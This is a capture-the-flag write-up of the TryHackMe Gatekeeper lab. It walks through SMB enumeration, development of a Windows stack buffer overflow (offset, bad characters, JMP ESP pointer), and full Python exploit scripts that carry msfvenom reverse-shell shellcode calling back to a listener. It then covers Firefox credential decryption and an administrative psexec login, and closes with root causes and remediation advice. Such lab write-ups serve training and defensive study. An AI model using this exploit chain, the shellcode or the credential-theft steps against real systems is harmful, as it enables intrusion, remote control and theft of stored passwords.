# Write-up: Gatekeeper lab (Medium) on THM

This document is a structured security write-up based on hands-on exploitation of the **Gatekeeper** lab on TryHackMe website: https://tryhackme.com/room/gatekeeper

**Date**: January 23, 2026  
**Source**: TryHackMe — Gatekeeper & Personal Hands-On Practice

---

## Summary

The **Gatekeeper** lab involves a Windows 7 machine running a vulnerable custom service on port 31337. Initial access was achieved by identifying an exposed **SMB share** which allowed for the exfiltration of the **gatekeeper.exe** binary. Through offline dynamic analysis using **Immunity Debugger**, a stack-based **buffer overflow** was identified, allowing for an EIP overwrite. By crafting a custom Python exploit with a JMP ESP pointer and an MSFvenom-generated shellcode, a **reverse shell** was established. Lateral movement and privilege escalation were then performed by decrypting stored **Firefox** credentials, yielding the password for the user **Mayor**, who possessed **administrative rights** on the system.

---

## Technical Overview
### 1. Discovery

By first, Nmap:  
```bash
nmap -sC -sV -v -Pn -p- 10.81.187.170
```

Result:  
<img width="774" height="337" alt="nmap1" src="https://github.com/user-attachments/assets/98e31862-8f4e-4d24-ab77-fc76c1e8737b" />
<img width="1224" height="939" alt="nmap2" src="https://github.com/user-attachments/assets/b68afbb8-2ebb-4131-a198-93565400a3c0" />

*Here is Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) standalone workgroup server, domain name **gatekeeper**.*

Interesting port:  
```text
31337/tcp open Elite?
```

---

SMB check:  
```bash
smbclient -L //10.81.187.170/ -N
```

Result:  
<img width="989" height="248" alt="smb" src="https://github.com/user-attachments/assets/73a18127-faf0-4173-a381-7e17f323030a" />

```bash
smbclient //10.81.187.170/Users -N
```

<img width="847" height="374" alt="smbinside" src="https://github.com/user-attachments/assets/87424f63-e201-4e3c-94b2-5fa8374b4332" />

Download it:  
```text
mget gatekeeper.exe
```

*In the other directories nothing interesting.*

---

Check the strange port:  
```bash
nc 10.81.187.170 31337
```

<img width="308" height="131" alt="nc1" src="https://github.com/user-attachments/assets/371871fd-cff7-449e-b5be-001479126316" />

*Huh. There is obviosly our challenge. There is gatekeeper.exe that we should to understand offline.*

---

### 2. Penetration

*I know that the lab about buffer overflow, so let's go deep into this gatekeeper.exe binary.*

Transfer gatekeeper.exe to a Windows machine and run it.

<img width="777" height="197" alt="gtwork" src="https://github.com/user-attachments/assets/b0b35a1d-3dc5-455c-b77e-432b320c08b5" />

We should to work with the Immunity Debugger tool this time. So, run it as well.

Attach gatekeeper.exe to the tool and click on run.

<img width="836" height="685" alt="attach" src="https://github.com/user-attachments/assets/711eb7d1-02d0-4fa5-b9dd-cd6a0448b279" />

Now let's send a lot of "A".

<img width="1920" height="1030" alt="nctest2" src="https://github.com/user-attachments/assets/37c5df32-632d-4b82-9796-769a6c97dbbe" />

Here we go, the program crashed. EIP is **41414141**, what means possibly there is buffer overflow (read about this at least in two words if you have no idea what is this).

---

Max byte test:  
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 333
```

<img width="1920" height="197" alt="pt_create" src="https://github.com/user-attachments/assets/aef780a5-bf1a-4be3-9110-68fa61f30975" />

Restart the program (Ctrl+F2) and send it.

Look at EIP:  
<img width="320" height="204" alt="39654138" src="https://github.com/user-attachments/assets/fc8f9df8-f67c-45c3-9a15-3f235bec1939" />

Use it:  
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 333 -q 39654138
```

Result:  
<img width="969" height="79" alt="offset" src="https://github.com/user-attachments/assets/eec5cac7-bb73-4ad1-bb61-8938824e2cd9" />

*So, exact match at offset here is 146 byte.*

---

*In the next I'm gonna use custom scripts to deliver an exploit. You can find these in my GitHub profile or copy from this page.*

Verifier for buffer overflow, script **"bof_Bs.py"**:  
```python3
#!/usr/bin/python3

import sys
import socket

padding = b"A" * 146
# 146 is our offset

eip = b"B" * 4
# Look for 42424242 in EIP

payload = padding + eip

try:
    print(f"[+] Sending payload to the target...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.0.15", 31337)) # our Windows machine where is running the binary
    s.send(payload + b"\r\n")
    s.close()
    print("[+] Payload sent.")
except Exception as e:
    print(f"[-] Connection failed: {e}")
    sys.exit()
```

```bash
python3 bof_Bs.py
```

The program crashed. Look at EIP value:  
<img width="342" height="220" alt="42424242" src="https://github.com/user-attachments/assets/6bf5fab6-3327-44a9-bb16-b3e4de9b4576" />

*Excellent. That works.*

---

Restart the program.

Another script **"bof_badcharacters.py"** for searching a bad characters:  
```python3
#!/usr/bin/python3

import sys
import socket

padding = b"A" * 146

eip = b"B" * 4

badchars = (
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

payload = padding + eip + badchars

try:
    print(f"[+] Sending payload to the target...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.0.15", 31337))
    s.send(payload + b"\r\n")
    s.close()
    print("[+] Payload sent.")
except Exception as e:
    print(f"[-] Connection failed: {e}")
    sys.exit()
```

*Lisf of the characters you can find in Google or copy above.*

```bash
python3 bof_badcharacters.py
```

Result:  
<img width="356" height="348" alt="eip228" src="https://github.com/user-attachments/assets/a61e5d7c-9904-4c2d-b99d-7598a331dc2a" />

So, **42424242** in EIP, now left click on ESP value -> right click **Follow in DUMP** -> see in the 00C41A88 section "...07 08 09 00..." — where 00 there supposed to be 0A so our bad character is **x0a**.

<img width="317" height="146" alt="x0a" src="https://github.com/user-attachments/assets/011aba8e-96cb-453e-9b79-f64b88e96831" />

---

Now look for a pointers (download "mona" from GitHub):  
```text
!mona jmp -r esp -cpb "\x00\x0a"
```

<img width="560" height="252" alt="mona" src="https://github.com/user-attachments/assets/69514792-cb8d-470b-997c-353e1b84c33c" />

We have two pointers there:  
```text
0x080414c3
0x080416bf
```

---

Generate a shellcode (IP and port of your listener; exclude the bad characters on -b parameter):  
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.134.69 LPORT=5555 -b "\x00\x0a" -f python
```

<img width="1088" height="892" alt="venom" src="https://github.com/user-attachments/assets/f21616a2-7dba-4a70-afb8-518c9898b4c9" />

Copy all of that.

Now use the another script **"bof_shellcode.py"** for sending the exploit:  
```python3
#!/usr/bin/python3

import sys
import socket

padding = b"A" * 146

# 0x080416bf, one of our pointers
eip = b"\xbf\x16\x04\x08"

# Tell a CPU do nothing
nops = b"\x90" * 32

# msfvenom output with our reverse shell shellcode
shellcode = (
b""
b"\xba\xa6\x30\x01\x1b\xd9\xca\xd9\x74\x24\xf4\x5d"
b"\x2b\xc9\xb1\x52\x31\x55\x12\x83\xed\xfc\x03\xf3"
b"\x3e\xe3\xee\x07\xd6\x61\x10\xf7\x27\x06\x98\x12"
b"\x16\x06\xfe\x57\x09\xb6\x74\x35\xa6\x3d\xd8\xad"
b"\x3d\x33\xf5\xc2\xf6\xfe\x23\xed\x07\x52\x17\x6c"
b"\x84\xa9\x44\x4e\xb5\x61\x99\x8f\xf2\x9c\x50\xdd"
b"\xab\xeb\xc7\xf1\xd8\xa6\xdb\x7a\x92\x27\x5c\x9f"
b"\x63\x49\x4d\x0e\xff\x10\x4d\xb1\x2c\x29\xc4\xa9"
b"\x31\x14\x9e\x42\x81\xe2\x21\x82\xdb\x0b\x8d\xeb"
b"\xd3\xf9\xcf\x2c\xd3\xe1\xa5\x44\x27\x9f\xbd\x93"
b"\x55\x7b\x4b\x07\xfd\x08\xeb\xe3\xff\xdd\x6a\x60"
b"\xf3\xaa\xf9\x2e\x10\x2c\x2d\x45\x2c\xa5\xd0\x89"
b"\xa4\xfd\xf6\x0d\xec\xa6\x97\x14\x48\x08\xa7\x46"
b"\x33\xf5\x0d\x0d\xde\xe2\x3f\x4c\xb7\xc7\x0d\x6e"
b"\x47\x40\x05\x1d\x75\xcf\xbd\x89\x35\x98\x1b\x4e"
b"\x39\xb3\xdc\xc0\xc4\x3c\x1d\xc9\x02\x68\x4d\x61"
b"\xa2\x11\x06\x71\x4b\xc4\x89\x21\xe3\xb7\x69\x91"
b"\x43\x68\x02\xfb\x4b\x57\x32\x04\x86\xf0\xd9\xff"
b"\x41\x3f\xb5\x79\xd4\xd7\xc4\x85\xc2\x94\x40\x63"
b"\x86\xca\x04\x3c\x3f\x72\x0d\xb6\xde\x7b\x9b\xb3"
b"\xe1\xf0\x28\x44\xaf\xf0\x45\x56\x58\xf1\x13\x04"
b"\xcf\x0e\x8e\x20\x93\x9d\x55\xb0\xda\xbd\xc1\xe7"
b"\x8b\x70\x18\x6d\x26\x2a\xb2\x93\xbb\xaa\xfd\x17"
b"\x60\x0f\x03\x96\xe5\x2b\x27\x88\x33\xb3\x63\xfc"
b"\xeb\xe2\x3d\xaa\x4d\x5d\x8c\x04\x04\x32\x46\xc0"
b"\xd1\x78\x59\x96\xdd\x54\x2f\x76\x6f\x01\x76\x89"
b"\x40\xc5\x7e\xf2\xbc\x75\x80\x29\x05\x85\xcb\x73"
b"\x2c\x0e\x92\xe6\x6c\x53\x25\xdd\xb3\x6a\xa6\xd7"
b"\x4b\x89\xb6\x92\x4e\xd5\x70\x4f\x23\x46\x15\x6f"
b"\x90\x67\x3c"
)

payload = padding + eip + nops + shellcode

try:
    print(f"[+] Sending payload to the target...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.81.187.170", 31337)) # IP and port of the target
    s.send(payload + b"\r\n")
    s.close()
    print("[+] Exploit sent.")
except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit()
```

---

```bash
nc -lnvp 5555
```

```bash
python3 bof_shellcode.py 
```

Result:  
<img width="730" height="181" alt="ncuser" src="https://github.com/user-attachments/assets/80e963f0-f053-4c04-87ab-90ba5b6789b5" />

*Success.*

<img width="780" height="519" alt="userflag" src="https://github.com/user-attachments/assets/3df69ea3-0af7-4163-b808-e5f4205d22cf" />

**The User Flag**:  
```text
{H4lf_W4y_Th3r3}
```

---

### 3. Escalation

Transfer **winPEAS.bat** to the target via SMB and run it:  
```cmd
winPEAS.bat cmd
```

winPEAS results:  
<img width="1481" height="486" alt="winpeas" src="https://github.com/user-attachments/assets/f9e19c15-3e18-4dec-a833-e2d8fde26588" />

In the Firefox directory **(C:\Users\natbat\AppData\Roaming\Mozilla\Firefox)** some interesting files. Firefox is not preinstalled on Windows by the way, so that's obviosly for us.

Interesting Firefox files:  
```text
cert9.db
cookies.sqlite
key4.db
logins.json
```

Download it via SMB to your machine and put it in an one folder, let's call it **"ffx"**.

Download **firefox_decrypt.py** from Internet.

Run it:  
```bash
./firefox_decrypt.py ffx
```

Result:  
<img width="1164" height="382" alt="ffx" src="https://github.com/user-attachments/assets/b080dcca-06ec-4f71-a27e-5fd9b64693f7" />

```text
mayor:8CL7O1N78MdrCIsV
```

*Now we have the high-privileged user in our pocket.*

```bash
impacket-psexec mayor:8CL7O1N78MdrCIsV@10.81.187.170
```

<img width="780" height="353" alt="imptexec" src="https://github.com/user-attachments/assets/16b50775-b7ee-42ec-8417-8e1b96d032a6" />

<img width="583" height="374" alt="root" src="https://github.com/user-attachments/assets/9acf8c65-4c7f-4bb9-996a-58f515de6395" />

**The Root Flag**:  
```text
{Th3_M4y0r_C0ngr4tul4t3s_U}
```

---

## Security Failures & Root Causes Classification

* **Improper Input Validation** — Buffer Overflow in Custom Binary — **Critical** Impact — The gatekeeper.exe service failed to validate the length of user-supplied input before copying it to a fixed-size stack buffer, allowing for arbitrary code execution.
* **Sensitive Information Disclosure** — Anonymous SMB Access — **High** Impact — The server allowed unauthenticated access to the /Users share, enabling an attacker to download internal binaries for offline reverse engineering and exploit development.
* **Insecure Credential Storage** — Reused/Stored Browser Passwords — **Medium** Impact — The administrative user Mayor stored high-privileged credentials within the Firefox profile; since these were not protected by a Master Password, they were easily decrypted once a low-privileged foothold was gained.
* **Lack of Exploit Mitigations** — Missing DEP/ASLR — **High** Impact — The vulnerable binary was compiled without modern protections like Data Execution Prevention or Address Space Layout Randomization, significantly simplifying the exploitation of the memory corruption flaw.

---

## Remediation Recommendations

* **Apply** secure coding practices to the gatekeeper.exe binary by replacing unsafe functions with bounded alternatives to prevent buffer overflows.
* **Disable** anonymous SMB access and restrict share permissions to authenticated users only, ensuring that sensitive system files and binaries cannot be exfiltrated.
* **Implement** endpoint hardening by enabling system-wide DEP and ASLR, and migrating from the end-of-life Windows 7 OS to a supported version with modern memory protections.
* **Enforce** a password policy that discourages storing administrative credentials in web browsers and requires the use of a Master Password if browser-based storage is used.

---

## Conclusion

> The compromise of the Gatekeeper lab highlights the danger of running unvetted custom applications on production systems. While the initial entry relied on a misconfigured file share, the total system takeover was made possible by a classic memory corruption vulnerability that is easily mitigated by modern compiler flags. This scenario serves as a reminder that security is not just about patching known software, but also about the rigorous auditing of proprietary tools and the protection of stored credentials that facilitate lateral movement.

---

*Write-up compiled based on TryHackMe Gatekeeper (https://tryhackme.com/room/gatekeeper) lab.*
